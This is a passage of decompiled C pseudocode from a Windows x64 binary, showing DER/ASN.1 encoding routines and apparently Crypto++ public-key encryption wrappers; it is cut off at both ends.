    }
    v5 = 1;
    while ( 1 )
    {
      --v6;
      if ( v4 & 0xFF00000000000000ui64 )
        sub_14003E950();
      if ( !(*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)v3 + 144i64))(v3, &v8) )
        break;
      v4 = v8 | (v4 << 8);
      if ( !v6 )
        goto LABEL_10;
    }
LABEL_12:
    sub_14003E950();
  }
  v5 = 1;
  v4 = v8;
LABEL_10:
  *v2 = v4;
  return v5;
}

//----- (00000001400600B0) ----------------------------------------------------
char __fastcall sub_1400600B0(__int64 a1, _QWORD *a2, _BYTE *a3)
{
  _QWORD *v3; // rdi
  _BYTE *v4; // r14
  __int64 v5; // rsi
  __int64 v6; // rax
  unsigned __int8 v7; // al
  int v8; // ebx
  unsigned __int8 v10; // [rsp+40h] [rbp+8h]

  v3 = a2;
  v4 = a3;
  v5 = a1;
  v6 = (*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)a1 + 144i64))(a1, &v10);
  if ( v6 )
  {
    v7 = v10;
    if ( (v10 & 0x80u) == 0 )
    {
      *v4 = 1;
      *v3 = v7;
LABEL_4:
      LOBYTE(v6) = 1;
      return v6;
    }
    v8 = v10 & 0x7F;
    if ( !(v10 & 0x7F) )
    {
      *v4 = v8;
      goto LABEL_4;
    }
    *v4 = 1;
    *v3 = 0i64;
    while ( 1 )
    {
      --v8;
      if ( *v3 & 0xFF00000000000000ui64 )
        sub_14003E950();
      v6 = (*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)v5 + 144i64))(v5, &v10);
      if ( !v6 )
        break;
      *v3 = v10 | (*v3 << 8);
      if ( !v8 )
        goto LABEL_4;
    }
  }
  return v6;
}

//----- (0000000140060170) ----------------------------------------------------
__int64 __fastcall sub_140060170(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 *v4; // r10
  unsigned __int64 v6; // [rsp+58h] [rbp+20h]

  v6 = a4;
  if ( *(_BYTE *)(a1 + 49) )
  {
    v4 = &v6;
    if ( a4 >= *(_QWORD *)(a1 + 56) )
      v4 = (unsigned __int64 *)(a1 + 56);
    a4 = *v4;
  }
  return (*(__int64 (__fastcall **)(_QWORD, __int64, __int64, unsigned __int64))(**(_QWORD **)(a1 + 40) + 256i64))(
           *(_QWORD *)(a1 + 40),
           a2,
           a3,
           a4);
}

//----- (00000001400601B0) ----------------------------------------------------
void __fastcall sub_1400601B0(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rsi
  _QWORD *v3; // rdi
  unsigned __int64 i; // rbx
  __int64 v5; // rax
  char v6; // ST20_1
  char v7; // [rsp+30h] [rbp-88h]
  __int64 v8; // [rsp+38h] [rbp-80h]
  __int64 v9; // [rsp+40h] [rbp-78h]
  __int64 v10; // [rsp+50h] [rbp-68h]

  v9 = -2i64;
  v2 = a2;
  v3 = a1;
  sub_1400565B0((__int64)&v10, 0i64);
  v7 = *(_BYTE *)(*v3 + 4i64) + 40 * *(_BYTE *)*v3;
  (*(void (__fastcall **)(__int64 *, char *, signed __int64))(v10 + 40))(&v10, &v7, 1i64);
  for ( i = 2i64; i < (v3[1] - *v3) >> 2; ++i )
    sub_1400607E0(&v10, *(_DWORD *)(*v3 + 4 * i));
  v7 = 6;
  (*(void (__fastcall **)(_QWORD *, char *, signed __int64))(*v2 + 40i64))(v2, &v7, 1i64);
  v5 = sub_140056B70((__int64)&v10);
  sub_140060690(v2, v5);
  v8 = -1i64;
  v6 = 1;
  (*(void (__fastcall **)(__int64 *, _QWORD *, __int64 *, void **, char))(v10 + 248))(
    &v10,
    v2,
    &v8,
    &qword_1400D8080,
    v6);
  sub_1400566F0(&v10);
}

//----- (0000000140060300) ----------------------------------------------------
void __fastcall sub_140060300(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rdi
  _QWORD *v4; // rax
  __int64 v5; // rbx
  char v6; // ST20_1
  __int64 v7; // rbx
  __int64 v8; // ST20_8
  __int64 v9; // rbx
  __int64 v10; // ST20_8
  char v11; // [rsp+30h] [rbp-C8h]
  __int64 v12; // [rsp+38h] [rbp-C0h]
  __int64 v13; // [rsp+40h] [rbp-B8h]
  void *v14; // [rsp+48h] [rbp-B0h]
  __int64 (__fastcall **v15)(void *); // [rsp+60h] [rbp-98h]
  __int64 (__fastcall **v16)(); // [rsp+68h] [rbp-90h]
  __int64 (__fastcall ***v17)(void *); // [rsp+A8h] [rbp-50h]
  __int16 v18; // [rsp+B0h] [rbp-48h]
  __int64 (__fastcall **v19)(void *); // [rsp+B8h] [rbp-40h]
  __int64 (__fastcall **v20)(); // [rsp+C0h] [rbp-38h]
  __int64 (__fastcall ***v21)(void *); // [rsp+108h] [rbp+10h]
  __int16 v22; // [rsp+110h] [rbp+18h]
  __int64 (__fastcall **v23)(void *); // [rsp+118h] [rbp+20h]
  __int64 (__fastcall **v24)(); // [rsp+120h] [rbp+28h]
  _QWORD *v25; // [rsp+168h] [rbp+70h]
  __int16 v26; // [rsp+170h] [rbp+78h]

  v13 = -2i64;
  v2 = a2;
  v3 = a1;
  sub_1400565B0((__int64)&v24, 0i64);
  v25 = v2;
  v26 = 12288;
  v23 = &off_1400A9C28;
  v24 = &off_1400ACF98;
  sub_1400565B0((__int64)&v15, 0i64);
  v17 = &v23;
  v18 = 12288;
  v15 = &off_1400A9C28;
  v16 = &off_1400ACF98;
  v4 = (_QWORD *)(*(__int64 (__fastcall **)(__int64, void **))(*(_QWORD *)v3 + 32i64))(v3, &v14);
  sub_1400601B0(v4, &v15);
  if ( v14 )
    operator delete(v14);
  (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(void *)))(*(_QWORD *)v3 + 48i64))(v3, &v15);
  LOBYTE(v18) = 1;
  v5 = sub_140056B70((__int64)&v15);
  v11 = HIBYTE(v18);
  ((void (__fastcall *)(__int64 (__fastcall ***)(void *), char *, signed __int64))(*v17)[5])(v17, &v11, 1i64);
  sub_140060690(v17, v5);
  v12 = -1i64;
  v6 = 1;
  ((void (__fastcall *)(__int64 (__fastcall ***)(void *), __int64 (__fastcall ***)(void *), __int64 *, void **, char))v15[31])(
    &v15,
    v17,
    &v12,
    &qword_1400D8080,
    v6);
  sub_1400565B0((__int64)&v19, 0i64);
  v19 = &off_1400A9C28;
  v20 = &off_1400ACF98;
  v21 = &v23;
  v22 = 768;
  v11 = 0;
  sub_1400570B0(&v19, &v11, 1ui64);
  (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(void *)))(*(_QWORD *)v3 + 64i64))(v3, &v19);
  LOBYTE(v22) = 1;
  v7 = sub_140056B70((__int64)&v19);
  v11 = HIBYTE(v22);
  ((void (__fastcall *)(__int64 (__fastcall ***)(void *), char *, signed __int64))(*v21)[5])(v21, &v11, 1i64);
  sub_140060690(v21, v7);
  v12 = -1i64;
  LOBYTE(v8) = 1;
  ((void (__fastcall *)(__int64 (__fastcall ***)(void *), __int64 (__fastcall ***)(void *), __int64 *, void **, __int64))v19[31])(
    &v19,
    v21,
    &v12,
    &qword_1400D8080,
    v8);
  LOBYTE(v26) = 1;
  v9 = sub_140056B70((__int64)&v23);
  v11 = HIBYTE(v26);
  (*(void (__fastcall **)(_QWORD *, char *, signed __int64))(*v25 + 40i64))(v25, &v11, 1i64);
  sub_140060690(v25, v9);
  v12 = -1i64;
  LOBYTE(v10) = 1;
  ((void (__fastcall *)(__int64 (__fastcall ***)(void *), _QWORD *, __int64 *, void **, __int64))v23[31])(
    &v23,
    v25,
    &v12,
    &qword_1400D8080,
    v10);
  sub_14005F8B0((__int64)&v19);
  sub_14005F8B0((__int64)&v15);
  sub_14005F8B0((__int64)&v23);
}
// 1400A9C28: using guessed type __int64 (__fastcall *off_1400A9C28)(void *);
// 1400ACF98: using guessed type __int64 (__fastcall *off_1400ACF98)();

//----- (00000001400605C0) ----------------------------------------------------
__int64 __fastcall sub_1400605C0(__int64 *a1)
{
  __int64 v1; // rax
  __int64 *v2; // rbx
  __int64 v3; // rax
  char v5; // [rsp+40h] [rbp+8h]

  v1 = *a1;
  v2 = a1;
  v5 = 5;
  (*(void (__fastcall **)(__int64 *, char *, signed __int64))(v1 + 40))(a1, &v5, 1i64);
  v3 = *v2;
  v5 = 0;
  return (*(__int64 (__fastcall **)(__int64 *, char *, signed __int64))(v3 + 40))(v2, &v5, 1i64);
}

//----- (0000000140060610) ----------------------------------------------------
signed __int64 __fastcall sub_140060610(_QWORD *a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // rax
  unsigned __int64 v4; // rbp
  __int64 v5; // rdi
  _QWORD *v6; // rsi
  signed __int64 v7; // rbx
  char v8; // ST20_1
  char v10; // [rsp+40h] [rbp+8h]

  v3 = *a1;
  v4 = a3;
  v5 = a2;
  v6 = a1;
  v10 = 4;
  (*(void (__fastcall **)(_QWORD *, char *, signed __int64))(v3 + 40))(a1, &v10, 1i64);
  v7 = sub_140060690(v6, v4);
  v8 = 1;
  (*(void (__fastcall **)(_QWORD *, __int64, unsigned __int64, _QWORD, char))(*v6 + 40i64))(v6, v5, v4, 0i64, v8);
  return v7 + v4 + 1;
}

//----- (0000000140060690) ----------------------------------------------------
signed __int64 __fastcall sub_140060690(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  _QWORD *v3; // r14
  __int64 v4; // rax
  signed __int64 result; // rax
  unsigned int v6; // edi
  unsigned int v7; // ebx
  unsigned int v8; // edx
  unsigned int v9; // er8
  unsigned int v10; // edx
  __int64 v11; // rax
  unsigned int v12; // ebx
  int v13; // edi
  __int64 v14; // rbp
  char v15; // [rsp+58h] [rbp+10h]

  v2 = a2;
  v3 = a1;
  if ( a2 > 0x7F )
  {
    v6 = 0;
    v7 = 64;
    if ( a2 )
    {
      v9 = 0;
      v10 = 64;
      do
      {
        if ( v2 >> ((v10 + v9) >> 1) )
          v9 = (v10 + v9) >> 1;
        else
          v10 = (v10 + v9) >> 1;
      }
      while ( v10 - v9 > 8 );
      v8 = v10 >> 3;
    }
    else
    {
      LOBYTE(v8) = 0;
    }
    v11 = *a1;
    v15 = v8 | 0x80;
    (*(void (__fastcall **)(_QWORD *, char *, signed __int64))(v11 + 40))(a1, &v15, 1i64);
    if ( !v2 )
      goto LABEL_23;
    do
    {
      if ( v2 >> ((v7 + v6) >> 1) )
        v6 = (v7 + v6) >> 1;
      else
        v7 = (v7 + v6) >> 1;
    }
    while ( v7 - v6 > 8 );
    v12 = v7 >> 3;
    if ( v12 )
    {
      v13 = 8 * v12 - 8;
      v14 = v12;
      do
      {
        v15 = v2 >> v13;
        (*(void (__fastcall **)(_QWORD *, char *, signed __int64))(*v3 + 40i64))(v3, &v15, 1i64);
        v13 -= 8;
        --v12;
      }
      while ( v12 );
      result = v14 + 1;
    }
    else
    {
LABEL_23:
      result = 1i64;
    }
  }
  else
  {
    v4 = *a1;
    v15 = a2;
    (*(void (__fastcall **)(_QWORD *, char *, signed __int64))(v4 + 40))(a1, &v15, 1i64);
    result = 1i64;
  }
  return result;
}

//----- (00000001400607E0) ----------------------------------------------------
__int64 __fastcall sub_1400607E0(__int64 *a1, unsigned int a2)
{
  unsigned int v2; // er8
  unsigned int v3; // ebx
  __int64 *v4; // rsi
  unsigned int v5; // edx
  int *v6; // rcx
  int v7; // eax
  int v8; // edi
  __int64 v9; // rax
  __int64 v10; // rax
  int v12; // [rsp+50h] [rbp+8h]
  unsigned int v13; // [rsp+58h] [rbp+10h]
  int v14; // [rsp+60h] [rbp+18h]

  v2 = 0;
  v3 = a2;
  v4 = a1;
  v14 = 7;
  if ( a2 )
  {
    v5 = 0;
    v2 = 32;
    do
    {
      if ( v3 >> ((v2 + v5) >> 1) )
        v5 = (v2 + v5) >> 1;
      else
        v2 = (v2 + v5) >> 1;
    }
    while ( v2 - v5 > 1 );
  }
  v6 = (int *)&v13;
  if ( v2 <= 7 )
    v6 = &v12;
  v13 = v2;
  v12 = 7;
  v7 = sub_14004CE30((unsigned int *)v6, (unsigned int *)&v14);
  v8 = v7 - 7;
  if ( v7 != 7 )
  {
    do
    {
      v9 = *v4;
      LOBYTE(v13) = (v3 >> v8) | 0x80;
      (*(void (__fastcall **)(__int64 *, unsigned int *, signed __int64))(v9 + 40))(v4, &v13, 1i64);
      v8 -= 7;
    }
    while ( v8 );
  }
  v10 = *v4;
  LOBYTE(v13) = v3 & 0x7F;
  return (*(__int64 (__fastcall **)(__int64 *, unsigned int *, signed __int64))(v10 + 40))(v4, &v13, 1i64);
}

//----- (00000001400608C0) ----------------------------------------------------
bool __fastcall sub_1400608C0(__int64 a1)
{
  char v2; // bl
  __int16 v3; // [rsp+30h] [rbp+8h]

  if ( *(_BYTE *)(a1 + 49) )
    return *(_QWORD *)(a1 + 56) == 0i64;
  v2 = 1;
  if ( sub_140038ED0(*(__int64 **)(a1 + 40), &v3, 1) != 2 || v3 )
    v2 = 0;
  return v2;
}

//----- (0000000140060910) ----------------------------------------------------
char __fastcall sub_140060910(__int64 a1, char a2)
{
  __int64 v2; // rdi
  char v3; // bl
  char result; // al
  char v5; // [rsp+30h] [rbp+8h]

  v2 = a1;
  v3 = a2;
  if ( !(*(__int64 (__fastcall **)(_QWORD, char *))(**(_QWORD **)(a1 + 40) + 144i64))(*(_QWORD *)(a1 + 40), &v5)
    || v5 != v3 )
  {
    sub_14003E950();
  }
  result = sub_1400600B0(*(_QWORD *)(v2 + 40), (_QWORD *)(v2 + 56), (_BYTE *)(v2 + 49));
  if ( !result )
    sub_14003E950();
  if ( !*(_BYTE *)(v2 + 49) && !(v3 & 0x20) )
    sub_14003E950();
  return result;
}

//----- (0000000140060990) ----------------------------------------------------
void __fastcall sub_140060990(__int64 a1)
{
  bool v1; // zf
  __int16 v2; // [rsp+30h] [rbp+8h]

  v1 = *(_BYTE *)(a1 + 49) == 0;
  *(_BYTE *)(a1 + 48) = 1;
  if ( v1 )
  {
    if ( sub_1400389E0(*(__int64 **)(a1 + 40), &v2, 1) != 2 || v2 )
      sub_14003E950();
  }
  else if ( *(_QWORD *)(a1 + 56) )
  {
    sub_14003E950();
  }
}

//----- (00000001400609E0) ----------------------------------------------------
__int64 __fastcall sub_1400609E0(__int64 a1)
{
  __int64 v1; // rdi
  __int64 v2; // rax
  __int64 v3; // rcx
  unsigned __int64 v4; // rbx
  __int64 v5; // rax
  __int64 v6; // rdx
  char v7; // ST20_1
  __int64 v9; // [rsp+40h] [rbp+8h]

  v1 = a1;
  *(_BYTE *)(a1 + 88) = 1;
  v2 = sub_140056B70(a1);
  v3 = *(_QWORD *)(v1 + 80);
  LOBYTE(v9) = *(_BYTE *)(v1 + 89);
  v4 = v2;
  (*(void (__fastcall **)(__int64, __int64 *, signed __int64))(*(_QWORD *)v3 + 40i64))(v3, &v9, 1i64);
  sub_140060690(*(_QWORD **)(v1 + 80), v4);
  v5 = *(_QWORD *)v1;
  v6 = *(_QWORD *)(v1 + 80);
  v9 = -1i64;
  v7 = 1;
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64 *, void **, char))(v5 + 248))(
           v1,
           v6,
           &v9,
           &qword_1400D8080,
           v7);
}

//----- (0000000140060A60) ----------------------------------------------------
__int64 __fastcall sub_140060A60(__int64 a1, __int64 a2, unsigned __int64 *a3)
{
  unsigned __int64 *v3; // rdi
  __int64 v4; // rbx
  unsigned __int64 v5; // rax
  __int64 result; // rax
  unsigned __int64 v7; // rdx
  unsigned __int64 v8; // rcx

  v3 = a3;
  v4 = a1;
  if ( *(_BYTE *)(a1 + 49) )
  {
    v5 = *(_QWORD *)(a1 + 56);
    if ( *a3 > v5 )
      *a3 = v5;
  }
  result = (*(__int64 (__cdecl **)(_QWORD))(**(_QWORD **)(a1 + 40) + 248i64))(*(_QWORD *)(a1 + 40));
  v7 = *v3;
  if ( *(_BYTE *)(v4 + 49) )
  {
    v8 = *(_QWORD *)(v4 + 56);
    if ( v8 < v7 )
      sub_14003E950();
    *(_QWORD *)(v4 + 56) = v8 - v7;
  }
  return result;
}

//----- (0000000140060AD0) ----------------------------------------------------
void __fastcall sub_140060AD0(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rbx
  _QWORD *v3; // rsi
  __int64 v4; // r8
  __int64 v5; // r9
  unsigned __int64 v6; // rcx
  signed __int64 v7; // rax
  unsigned __int64 v8; // rdi
  __int64 v9; // rdx
  signed __int64 v10; // r8
  unsigned __int64 v11; // rcx
  unsigned __int64 v12; // rdx
  unsigned __int64 v13; // rdx
  _DWORD *v14; // rdi
  __int64 v15; // rax
  unsigned __int64 v16; // rcx

  v2 = a2;
  v3 = a1;
  v4 = a1[1];
  v5 = *a1;
  v6 = (a1[1] - *a1) >> 2;
  if ( v6 <= a2 )
  {
    if ( v6 >= a2 )
      return;
    v8 = a2 - v6;
    v9 = v3[2];
    if ( (v3[2] - v4) >> 2 < v8 )
    {
      v10 = 0x3FFFFFFFFFFFFFFFi64;
      if ( 0x3FFFFFFFFFFFFFFFi64 - v6 < v8 )
      {
        std::_Xlength_error("vector<T> too long");
        __debugbreak();
      }
      v11 = v8 + v6;
      v12 = (v9 - v5) >> 2;
      if ( v10 - (v12 >> 1) >= v12 )
        v13 = (v12 >> 1) + v12;
      else
        v13 = 0i64;
      if ( v13 < v11 )
        v13 = v11;
      sub_14004C370((__int64)v3, v13);
    }
    v14 = (_DWORD *)v3[1];
    v15 = (v3[1] - *v3) >> 2;
    v16 = v2 - v15;
    if ( v2 != v15 )
    {
      while ( v16 )
      {
        *v14 = 0;
        ++v14;
        --v16;
      }
    }
    v7 = v3[1] + 4 * (v2 - ((v3[1] - *v3) >> 2));
  }
  else
  {
    v7 = v4 + 4 * (a2 - v6);
  }
  v3[1] = v7;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140060BD0) ----------------------------------------------------
_QWORD *__fastcall sub_140060BD0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rdi
  _QWORD *v5; // rsi
  _QWORD *result; // rax

  v3 = a2;
  v4 = a3;
  v5 = (_QWORD *)a1;
  sub_140036DA0(a1, 0);
  *v5 = &off_1400AD0A0;
  v5[3] = v3;
  v5[1] = off_1400A9A98;
  v5[4] = v4;
  result = v5;
  v5[5] = 0i64;
  return result;
}
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();
// 1400AD0A0: using guessed type __int64 (__fastcall *off_1400AD0A0)();

//----- (0000000140060C30) ----------------------------------------------------
std::exception *__fastcall sub_140060C30(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140060CB0) ----------------------------------------------------
std::exception *__fastcall sub_140060CB0(std::exception *a1, const struct std::exception *a2)
{
  std::exception *v2; // rbx

  v2 = a1;
  sub_140060C30(a1, a2);
  *(_QWORD *)v2 = &off_1400A8798;
  return v2;
}
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140060CE0) ----------------------------------------------------
_DWORD *__fastcall sub_140060CE0(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 6;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140060DC0) ----------------------------------------------------
__int64 __fastcall sub_140060DC0(__int64 a1)
{
  unsigned __int64 v1; // rax
  unsigned __int64 v2; // rdx
  __int64 result; // rax

  v1 = *(_QWORD *)(a1 + 32);
  v2 = *(_QWORD *)(a1 + 40);
  if ( v1 <= v2 )
    result = 0i64;
  else
    result = v1 - v2;
  return result;
}

//----- (0000000140060DE0) ----------------------------------------------------
__int64 __fastcall sub_140060DE0(__int64 a1, _QWORD *a2)
{
  *a2 = 0i64;
  return 0i64;
}

//----- (0000000140060DF0) ----------------------------------------------------
void __fastcall sub_140060DF0(__int64 a1, __int64 *a2, __int64 a3, __int64 a4)
{
  __int64 v4; // r12
  __int64 v5; // rbp
  __int64 *v6; // rsi
  __int64 v7; // r14
  __int64 *v8; // rbx
  __int64 v9; // rax
  __int64 v10; // rdi
  unsigned int v11; // eax
  unsigned __int64 v12; // rdi
  __int64 v13; // rax
  __int64 v14; // rbx
  _QWORD *v15; // rax
  void *v16; // rdx
  unsigned __int64 v17; // rdi
  __int64 v18; // rax
  void *v19; // rdx
  char v20; // [rsp+20h] [rbp-C8h]
  __int64 v21; // [rsp+30h] [rbp-B8h]
  void *v22; // [rsp+38h] [rbp-B0h]
  char v23; // [rsp+48h] [rbp-A0h]
  __int64 v24; // [rsp+50h] [rbp-98h]
  __int64 v25; // [rsp+58h] [rbp-90h]
  _QWORD v26[2]; // [rsp+60h] [rbp-88h]
  __int64 v27; // [rsp+70h] [rbp-78h]
  void *Memory; // [rsp+78h] [rbp-70h]

  v25 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  (*(void (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 136i64))(a1, &v23);
  v8 = (__int64 *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(v7 + 16) + 16i64))(v7 + 16);
  v9 = (*(__int64 (__fastcall **)(__int64 *))(*v6 + 144))(v6);
  v10 = *v8;
  v11 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v9 + 56i64))(v9);
  v12 = (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD))(v10 + 8))(v8, v24, v11);
  if ( sub_140060F80(v7) < v12 )
  {
    sub_140060CE0(v26);
    CxxThrowException(v26, &_TI4_AVcls_039_cls_037_CryptoPP__);
  }
  v13 = sub_140060F80(v7);
  sub_140038C40((__int64)(v6 + 4), (unsigned __int64)(v13 + 7) >> 3);
  v14 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(v7 + 16) + 8i64))(v7 + 16);
  v15 = sub_14003C170(v26, v5, v4, 0);
  (*(void (__fastcall **)(__int64, char *, _QWORD *))(*(_QWORD *)v14 + 56i64))(v14, &v20, v15);
  v16 = Memory;
  memset(Memory, 0, 8 * v27);
  free(v16);
  v17 = (unsigned int)sub_140045340((__int64)&v20);
  if ( v17 > sub_140060F80(v7) )
  {
    v18 = sub_14004C270();
    sub_14003C670((__int64)&v20, v18);
  }
  sub_140047070((__int64)&v20, v6[6], v6[5], 0);
  v19 = v22;
  memset(v22, 0, 8 * v21);
  free(v19);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D44F0: using guessed type int _TI4_AVcls_039_cls_037_CryptoPP__;

//----- (0000000140060F80) ----------------------------------------------------
__int64 __fastcall sub_140060F80(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rax
  unsigned int v3; // eax
  int v4; // eax
  unsigned int v5; // ebx
  void *v6; // rdx
  char v8; // [rsp+28h] [rbp-30h]
  __int64 v9; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v1 = (**(__int64 (__cdecl ***)(signed __int64))(a1 + 16))(a1 + 16);
  v2 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v1 + 16i64))(v1, &v8);
  v3 = sub_140045340(v2);
  if ( v3 <= 1 )
    v4 = 0;
  else
    v4 = v3 - 1;
  v5 = v4;
  v6 = Memory;
  memset(Memory, 0, 8 * v9);
  free(v6);
  return v5;
}

//----- (00000001400611D0) ----------------------------------------------------
__int64 __fastcall sub_1400611D0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbp
  __int64 v5; // r14
  __int64 v6; // r13
  __int64 v7; // r12
  __int64 *v8; // r15
  __int64 v9; // rax
  __int64 v10; // rbx
  unsigned int v11; // eax
  unsigned __int64 v12; // rbx
  __int64 v13; // rsi
  __int64 v14; // rdi
  __int64 v15; // rbx
  __int64 v16; // rax
  char v17; // ST20_1
  __m128i v19; // [rsp+40h] [rbp-B8h]
  __int128 v20; // [rsp+50h] [rbp-A8h]
  char v21; // [rsp+60h] [rbp-98h]

  v4 = a2;
  v5 = a4;
  v6 = a3;
  v7 = a1;
  (*(void (__fastcall **)(__int64, __m128i *))(*(_QWORD *)a1 + 136i64))(a1, &v19);
  v8 = (__int64 *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(v7 + 16) + 16i64))(v7 + 16);
  v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 144i64))(v5);
  v10 = *v8;
  v11 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v9 + 56i64))(v9);
  v12 = (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD))(v10 + 8))(v8, v19.m128i_i64[1], v11);
  if ( sub_140060F80(v7) < v12 )
  {
    sub_140060CE0(&v21);
    CxxThrowException(&v21, &_TI4_AVcls_039_cls_037_CryptoPP__);
  }
  v13 = *v8;
  v14 = *(_QWORD *)(v5 + 48);
  _mm_store_si128((__m128i *)&v20, v19);
  v15 = sub_140060F80(v7);
  v16 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 144i64))(v5);
  v17 = *(_BYTE *)(v5 + 184);
  (*(void (__fastcall **)(__int64 *, __int64, __int64, __int128 *, char, __int64, __int64, __int64))(v13 + 64))(
    v8,
    v4,
    v16,
    &v20,
    v17,
    v14,
    v15,
    v6);
  *(_BYTE *)(v5 + 184) = 1;
  return v4;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D44F0: using guessed type int _TI4_AVcls_039_cls_037_CryptoPP__;

//----- (0000000140061320) ----------------------------------------------------
__int64 __fastcall sub_140061320(__int64 a1, __int64 a2)
{
  __int64 v2; // r14
  __int64 v3; // rbp
  __int64 *v4; // r15
  __int64 v5; // rax
  __int64 v6; // rbx
  unsigned int v7; // eax
  unsigned __int64 v8; // rbx
  __int64 v9; // rsi
  __int64 v10; // rdi
  __int64 v11; // rbx
  __int64 v12; // rax
  __int64 result; // rax
  __m128i v14; // [rsp+30h] [rbp-98h]
  __int128 v15; // [rsp+40h] [rbp-88h]
  char v16; // [rsp+50h] [rbp-78h]

  v2 = a2;
  v3 = a1;
  (*(void (__fastcall **)(__int64, __m128i *))(*(_QWORD *)a1 + 136i64))(a1, &v14);
  v4 = (__int64 *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(v3 + 16) + 16i64))(v3 + 16);
  v5 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v2 + 144i64))(v2);
  v6 = *v4;
  v7 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 56i64))(v5);
  v8 = (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD))(v6 + 8))(v4, v14.m128i_i64[1], v7);
  if ( sub_140060F80(v3) < v8 )
  {
    sub_140060CE0(&v16);
    CxxThrowException(&v16, &_TI4_AVcls_039_cls_037_CryptoPP__);
  }
  v9 = *v4;
  v10 = *(_QWORD *)(v2 + 48);
  _mm_store_si128((__m128i *)&v15, v14);
  v11 = sub_140060F80(v3);
  v12 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v2 + 144i64))(v2);
  result = (*(__int64 (__fastcall **)(__int64 *, __int64, __int128 *, _QWORD, __int64, __int64))(v9 + 56))(
             v4,
             v12,
             &v15,
             *(unsigned __int8 *)(v2 + 184),
             v10,
             v11);
  *(_BYTE *)(v2 + 184) = 1;
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D44F0: using guessed type int _TI4_AVcls_039_cls_037_CryptoPP__;

//----- (0000000140061550) ----------------------------------------------------
void __fastcall sub_140061550(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // r8
  unsigned __int64 v4; // r9
  signed __int64 v5; // rax
  unsigned __int64 v6; // r10
  __m128i v7; // xmm0
  unsigned __int64 v8; // rdx
  signed __int64 v9; // rax
  unsigned __int64 v10; // r8
  unsigned int v11; // ecx

  v3 = a3 >> 2;
  v4 = 0i64;
  if ( v3 )
  {
